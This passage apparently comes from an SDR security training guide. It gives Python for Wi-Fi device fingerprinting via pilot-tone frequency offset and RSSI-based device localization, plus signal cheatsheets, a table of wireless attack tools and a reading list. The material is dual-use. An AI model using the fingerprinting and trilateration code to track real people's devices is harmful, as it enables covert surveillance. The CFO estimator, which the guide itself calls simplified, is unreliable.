Every 802.11 OFDM frame contains pilot subcarriers — known reference tones at fixed subcarrier positions. These can be used for:

- **Device fingerprinting:** Slight frequency and phase offset patterns in pilot tones are hardware-specific
- **Channel estimation:** Reconstruct the multipath channel for signal processing
- **Carrier frequency offset (CFO) measurement:** Each device has a unique CFO signature

```python
# Wi-Fi device fingerprinting from pilot tone analysis
# Requires full IQ capture of 802.11 frames (HackRF or USRP)

def extract_pilot_cfo(iq_frame, fft_size=64, cp_length=16):
    """
    Extract carrier frequency offset from 802.11 OFDM pilot tones.
    802.11 pilot subcarriers: -21, -7, +7, +21 (BPSK pilots)
    """
    # Remove cyclic prefix
    symbol = iq_frame[cp_length:cp_length + fft_size]
    
    # FFT
    spectrum = np.fft.fft(symbol, n=fft_size)
    
    # Pilot subcarrier indices (in 64-point FFT, centered at DC)
    # -21 mod 64 = 43, -7 mod 64 = 57, +7 = 7, +21 = 21
    pilot_indices = [43, 57, 7, 21]
    pilot_known = [1, 1, 1, -1]  # Known BPSK pilot values
    
    # Measure phase of each pilot
    pilot_phases = []
    for idx, expected in zip(pilot_indices, pilot_known):
        pilot = spectrum[idx]
        # Remove known pilot value rotation
        corrected = pilot * expected
        pilot_phases.append(np.angle(corrected))
    
    # CFO estimate from linear phase slope across pilot positions
    # (simplified — full CFO estimation is more complex)
    phase_diff = np.mean(np.diff(sorted(pilot_phases)))
    cfo_estimate = phase_diff * (64 / (2 * np.pi * 1e-7))  # Rough Hz estimate
    
    return cfo_estimate, pilot_phases
```

**RSSI-based localization:**

```python
# Wi-Fi location estimation from RSSI measurements
# Not strictly SDR but directly relevant to RF security

import numpy as np
from scipy.optimize import minimize

def rssi_to_distance(rssi_dbm, path_loss_exp=3.0, rssi_at_1m=-40):
    """Convert RSSI to estimated distance (meters)"""
    return 10 ** ((rssi_at_1m - rssi_dbm) / (10 * path_loss_exp))

def trilaterate(ap_positions, distances):
    """
    Estimate device position from distances to multiple APs.
    ap_positions: list of (x, y) AP coordinates
    distances: list of estimated distances to each AP
    """
    def residuals(pos):
        x, y = pos
        return sum(
            (np.sqrt((x-px)**2 + (y-py)**2) - d)**2
            for (px, py), d in zip(ap_positions, distances)
        )
    
    x0 = np.mean([p[0] for p in ap_positions])
    y0 = np.mean([p[1] for p in ap_positions])
    result = minimize(residuals, [x0, y0], method='Nelder-Mead')
    return result.x
```

---

## Quick Reference

### Signal Identification Cheatsheet

```
Bandwidth    Shape           Behavior      → Most Likely
─────────────────────────────────────────────────────────────
< 1 kHz      Narrow spike    Constant       CW carrier / beacon
1–5 kHz      Double-hump     Constant       FSK data (NRZ)
5–15 kHz     Single peak     Bursty         OOK/ASK (remotes, sensors)
10–25 kHz    Single peak     Constant       NBFM voice
~200 kHz     Raised cosine   Bursty         LoRa chirp (check for sweep)
200 kHz      Wide, flat      Constant       WBFM broadcast
1–2 MHz      Very wide flat  Bursty         Bluetooth (FHSS, look for hopping)
20 MHz       Flat rectangle  Bursty         Wi-Fi 802.11 channel
Any          Sloped chirp    Bursty         LoRa (frequency-swept bursts)
Wide flat    Noise-like      Constant       DSSS (GPS, 802.11b, etc.)
```

### Common Protocol Parameters

| Protocol | Frequency | Modulation | Symbol Rate | Key Tool |
|----------|-----------|-----------|------------|---------|
| LoRa EU | 868 MHz | CSS (chirp) | SF-dependent | gr-lora, ChirpStack |
| LoRa US | 915 MHz | CSS | SF-dependent | gr-lora |
| ZigBee | 2.405–2.480 GHz | O-QPSK | 250 kbps | KillerBee |
| 433 ISM OOK | 433.92 MHz | OOK | 1–10 kbps | rtl_433, URH |
| KeeLoq | 315/433 MHz | OOK | ~5 kbps | URH + custom |
| nRF24 (ShockBurst) | 2.4–2.525 GHz | GFSK | 250k/1M/2Mbps | mousejack tools |
| CC1101 default | 433.92 MHz | FSK/OOK | Configurable | URH, GNU Radio |

### Exploitation Framework Selection

| Scenario | Tool | Why |
|----------|------|-----|
| Unknown ISM signal | URH + inspectrum | Best for visual RE + bit extraction |
| Known 200+ protocols | rtl_433 | Auto-identifies most consumer devices |
| Custom protocol fuzz | GNU Radio + Python fuzzer | Flexible; scriptable |
| Firmware RE | Ghidra + SVD-Loader | Best static analysis for embedded |
| LoRa stack attack | ChirpStack + gr-lora | Full protocol stack visibility |
| ZigBee attack | KillerBee | Purpose-built; mature |
| Firmware emulation fuzz | Unicorn + AFL++ | No hardware needed |
| EM side-channel | RTL-SDR/SDR + near-field probe | Low cost entry |

---

## Further Reading

**Papers and Research:**
- Van Eck, W. (1985) — *Electromagnetic Radiation from Video Display Units: An Eavesdropping Risk* (original TEMPEST paper)
- Vuagnoux & Pasini (2009) — *Compromising Electromagnetic Emanations of Wired and Wireless Keyboards* (Usenix Security)
- Marinov, M. — TempestSDR GitHub repository (practical Van Eck implementation)
- Ronen et al. — *IoT Goes Nuclear: Creating a ZigBee Chain Reaction* (IEEE S&P 2017)
- Yang et al. — *LoRaWAN Replay Attack and Session Key Extraction*
- Robyns et al. — *Physical-Layer Fingerprinting of LoRa devices* (WiSec 2017)

**Tools referenced:**
- TempestSDR: github.com/martinmarinov/TempestSDR
- gr-lora: github.com/rpp0/gr-lora
- KillerBee: github.com/riverloopsec/killerbee
- URH: github.com/jopohl/urh
- MouseJack: github.com/BastilleResearch/mousejack
- YARD Stick One: greatscottgadgets.com/yardstickone
- Unicorn Engine: github.com/unicorn-engine/unicorn
- Qiling: github.com/qilingframework/qiling
- RadioML dataset: deepsig.ai/datasets
- SigMF: github.com/sigmf/SigMF

**Hardwear.io training:**
- Original course: *SDR Hacking Advanced: Reversing and Exploiting Wireless Communications* — Sébastien Dudek, hardwear.io
- Trainer profile: hardwear.io/trainer/sebastien-dudek

---

*Companion guide to the hardwear.io advanced SDR training curriculum. Maintained as part of the ULTIMATE-CYBERSECURITY-MASTER-GUIDE. All techniques are for authorized security research and CTF use only.*
